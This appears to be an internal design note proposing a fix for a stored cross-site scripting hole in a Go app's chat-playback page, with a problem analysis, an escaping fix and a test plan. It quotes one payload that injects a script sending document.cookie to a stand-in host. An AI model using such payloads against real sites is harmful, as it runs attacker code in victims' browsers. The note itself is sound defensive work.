# Fix #5 -- Stored XSS in the chat-playback page title

## Status

**Draft for discussion.** Not started. From CTF.md finding #5. Cheapest of the
four -- recommended to ship first.

## Problem

`handleChatPlaybackPage` interpolates the recording's name into HTML with
`fmt.Fprintf` and no escaping:

```go
// main.go:6746
title = meta.Name + " -- Chat"
...
// main.go:6758  ->  rendered via fmt.Fprintf(w, `...<title>%s</title>...`, title, ...)
```

`meta.Name` originates from a session name. The **rename** path validates
characters (main.go, `rename_session` case: alnum + space + `-_/.@`, no `<`),
but the **initial** name taken from the `name` query param at session creation
is stored into `Metadata.Name` unvalidated (WS handler `name` query ->
`SessionParams.Name` -> `name := p.Name` -> `Metadata{Name: name}`). A session
created with:

```
name=</title><script>fetch('//evil/?'+document.cookie)</script>
```

persists that payload in `.../recordings/session-*.metadata.json`; anyone who
later opens `/recording/{uuid}/chat` executes it. The homepage is safe because
it renders names through auto-escaping `html/template`; this hand-rolled page
is the one unescaped sink.

(The auth cookie is HttpOnly, so this does not directly steal it, but it runs
attacker JS on the trusted origin -- enough to drive same-origin state-changing
requests as the viewer.)

## Proposed fix

Escape at the sink:

```go
title := "Chat Playback"
if ... meta.Name != "" {
    title = meta.Name + " -- Chat"
}
// render with html.EscapeString(title)
```

Audit the rest of `handleChatPlaybackPage`'s `fmt.Fprintf` args (and the sibling
`handleRecordingPage`) for any other unescaped user-derived values while we are
here.

### Deliberately NOT doing

Tightening the creation-time `name` validator to match the rename charset.
Reason: the app's own shell sessions auto-generate names like
`"<parent> (Terminal)"` which contain parentheses that the rename charset
(alnum + space + `-_/.@`) already forbids. Applying that charset at creation
would reject the app's own generated names. Output-encoding is the correct,
sufficient fix; input-tightening would be both incomplete (other sinks) and
self-breaking.

## Operational impact on deployed instances

**~NONE.** Pure output-encoding change. Existing recordings whose names contain
HTML-ish characters simply render correctly-escaped instead of as raw markup.
No config, no migration, no behavior change for any legitimate name.

## Open questions

1. Any other consumers of `Metadata.Name` that build HTML/JS by hand (vs
   templates)? Quick grep before shipping; if found, fix in the same change.
2. Is the `DataURL` / `eventsURL` value (UUID-derived) ever attacker-influenced?
   It is UUID-validated upstream, so likely fine -- confirm.

## Test plan (TDD)

- Unit/handler test: set a recording's `Metadata.Name` to
  `</title><script>x</script>`, request the chat-playback page, assert the
  response body contains the escaped form (`&lt;script&gt;`) and NOT the raw
  `<script>`.
- Regression: a benign name renders unchanged (modulo escaping of `&`).
